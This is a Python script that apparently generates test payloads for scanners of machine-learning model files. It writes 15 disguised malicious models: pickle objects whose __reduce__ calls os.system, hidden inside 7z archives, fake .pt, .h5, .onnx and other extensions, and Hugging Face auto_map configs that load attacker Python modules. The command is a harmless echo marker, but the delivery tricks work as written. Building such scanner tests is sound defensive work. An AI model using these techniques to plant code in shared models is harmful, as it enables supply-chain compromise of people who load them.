import os
import pickle
import py7zr
import json
import sys

def generate_attacks(output_dir):
    os.makedirs(output_dir, exist_ok=True)
    print(f"[*] Generating 15 real-world attack payloads in {output_dir}...")

    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, ('echo "RCE_PROOF" > /tmp/fuzzpickle_pwned',))

    # ---------------------------------------------------------
    # Attack 1: The 7z NullifAI Bypass
    # ---------------------------------------------------------
    attack_7z_dir = os.path.join(output_dir, "01_7z_bypass")
    os.makedirs(attack_7z_dir, exist_ok=True)
    temp_pkl = os.path.join(attack_7z_dir, "evil.pkl")
    with open(temp_pkl, "wb") as f:
        pickle.dump(MaliciousPayload(), f)
    with py7zr.SevenZipFile(os.path.join(attack_7z_dir, "model.7z"), 'w') as archive:
        archive.write(temp_pkl, arcname="evil.pkl")
    os.remove(temp_pkl)

    # ---------------------------------------------------------
    # Attack 2: The auto_map / SafeTensors Bypass
    # ---------------------------------------------------------
    automap_dir = os.path.join(output_dir, "02_automap_bypass")
    os.makedirs(automap_dir, exist_ok=True)
    with open(os.path.join(automap_dir, "model.safetensors"), "wb") as f:
        f.write(b"\x00" * 100)
    config = {"architectures": ["EvilModel"], "auto_map": {"AutoModel": "malicious_module.EvilModel"}}
    with open(os.path.join(automap_dir, "config.json"), "w") as f:
        json.dump(config, f, indent=4)
    with open(os.path.join(automap_dir, "malicious_module.py"), "w") as f:
        f.write('import os\nos.system("echo RCE_PROOF > /tmp/fuzzpickle_pwned")\n')

    # ---------------------------------------------------------
    # Attack 3: MLflow statsmodels Bypass (CVE-2026-96804)
    # ---------------------------------------------------------
    mlflow_dir = os.path.join(output_dir, "03_mlflow_statsmodels")
    os.makedirs(mlflow_dir, exist_ok=True)
    with open(os.path.join(mlflow_dir, "model.pkl"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 4: MLflow dspy Extension Bypass (CVE-2026-96775)
    # ---------------------------------------------------------
    dspy_dir = os.path.join(output_dir, "04_mlflow_dspy")
    os.makedirs(dspy_dir, exist_ok=True)
    with open(os.path.join(dspy_dir, "model.txt"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 5: numpy object dtype bypass
    # ---------------------------------------------------------
    numpy_dir = os.path.join(output_dir, "05_numpy_object")
    os.makedirs(numpy_dir, exist_ok=True)
    try:
        import numpy as np
        arr = np.array([MaliciousPayload()], dtype=object)
        np.save(os.path.join(numpy_dir, "model.npy"), arr, allow_pickle=True)
    except ImportError:
        print("[-] Numpy not installed. Skipping Attack 5.")

    # ---------------------------------------------------------
    # Attack 6: Fake SafeTensors with malicious config (auto_map crypto)
    # ---------------------------------------------------------
    automap_dir2 = os.path.join(output_dir, "06_automap_crypto")
    os.makedirs(automap_dir2, exist_ok=True)
    with open(os.path.join(automap_dir2, "model.safetensors"), "wb") as f:
        f.write(b"\x00" * 50)
    with open(os.path.join(automap_dir2, "config.json"), "w") as f:
        json.dump({"auto_map": {"AutoModel": "crypto_miner.Start"}}, f)
    with open(os.path.join(automap_dir2, "crypto_miner.py"), "w") as f:
        f.write('import os\nos.system("echo RCE_PROOF > /tmp/fuzzpickle_pwned")\n')

    # ---------------------------------------------------------
    # Attack 7: The .pt extension trick
    # ---------------------------------------------------------
    ext_dir = os.path.join(output_dir, "07_extension_bypass")
    os.makedirs(ext_dir, exist_ok=True)
    with open(os.path.join(ext_dir, "model.pt"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 8: The 7z bypass inside a fake HuggingFace folder
    # ---------------------------------------------------------
    hf_7z_dir = os.path.join(output_dir, "08_hf_7z_combo")
    os.makedirs(hf_7z_dir, exist_ok=True)
    temp_pkl2 = os.path.join(hf_7z_dir, "inner.pkl")
    with open(temp_pkl2, "wb") as f:
        pickle.dump(MaliciousPayload(), f)
    with py7zr.SevenZipFile(os.path.join(hf_7z_dir, "pytorch_model.bin.7z"), 'w') as archive:
        archive.write(temp_pkl2, arcname="inner.pkl")
    os.remove(temp_pkl2)

    # ---------------------------------------------------------
    # Attack 9: The PyTorch JIT (TorchScript) bypass
    # ---------------------------------------------------------
    jit_dir = os.path.join(output_dir, "09_torchscript")
    os.makedirs(jit_dir, exist_ok=True)
    with open(os.path.join(jit_dir, "model.pt"), "wb") as f:
        f.write(b"PK\x03\x04")
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 10: The config.json parameter injection
    # ---------------------------------------------------------
    config_dir = os.path.join(output_dir, "10_config_injection")
    os.makedirs(config_dir, exist_ok=True)
    with open(os.path.join(config_dir, "config.json"), "w") as f:
        json.dump({"model_type": "evil", "hidden_size": "os.system('echo RCE_PROOF > /tmp/fuzzpickle_pwned')"}, f)

    # ---------------------------------------------------------
    # Attack 11: The Keras Lambda Layer bypass
    # ---------------------------------------------------------
    keras_dir = os.path.join(output_dir, "11_keras_lambda")
    os.makedirs(keras_dir, exist_ok=True)
    with open(os.path.join(keras_dir, "model.h5"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 12: The TFLite custom op bypass
    # ---------------------------------------------------------
    tflite_dir = os.path.join(output_dir, "12_tflite_custom_op")
    os.makedirs(tflite_dir, exist_ok=True)
    with open(os.path.join(tflite_dir, "model.tflite"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 13: The joblib / dill bypass
    # ---------------------------------------------------------
    joblib_dir = os.path.join(output_dir, "13_joblib_bypass")
    os.makedirs(joblib_dir, exist_ok=True)
    with open(os.path.join(joblib_dir, "model.joblib"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 14: The FastAI export bypass
    # ---------------------------------------------------------
    fastai_dir = os.path.join(output_dir, "14_fastai_export")
    os.makedirs(fastai_dir, exist_ok=True)
    with open(os.path.join(fastai_dir, "export.pkl"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # ---------------------------------------------------------
    # Attack 15: The ONNX external data bypass
    # ---------------------------------------------------------
    onnx_dir = os.path.join(output_dir, "15_onnx_external")
    os.makedirs(onnx_dir, exist_ok=True)
    with open(os.path.join(onnx_dir, "model.onnx"), "wb") as f:
        f.write(b"ONNX")
        pickle.dump(MaliciousPayload(), f)

    print("[+] Successfully generated 15 framework attack payloads.")

if __name__ == "__main__":
    output_dir = sys.argv[1] if len(sys.argv) > 1 else "fuzz_files/attack_payloads"
    generate_attacks(output_dir)
